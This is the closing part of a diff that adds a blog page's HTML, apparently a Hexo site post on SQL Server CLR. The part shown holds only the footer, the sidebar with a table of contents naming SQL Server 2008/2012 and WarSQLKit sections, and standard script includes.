+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2020/06/26/SQLServer-CLR/"
+           data-title="SQLServer CLR" data-url="http://yoursite.com/2020/06/26/SQLServer-CLR/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">143</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#实战SQLServer-2008"><span class="nav-number">1.</span> <span class="nav-text">实战SQLServer 2008</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实战SQLServer-2012"><span class="nav-number">2.</span> <span class="nav-text">实战SQLServer 2012</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WarSQLKit"><span class="nav-number">2.1.</span> <span class="nav-text">WarSQLKit</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="theme-info">
+	-
+  <a class="theme-link" href="">
+    不为虚度年华而悔恨，不因碌碌无为而羞耻，不负此生。
+  </a>
+</div>
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
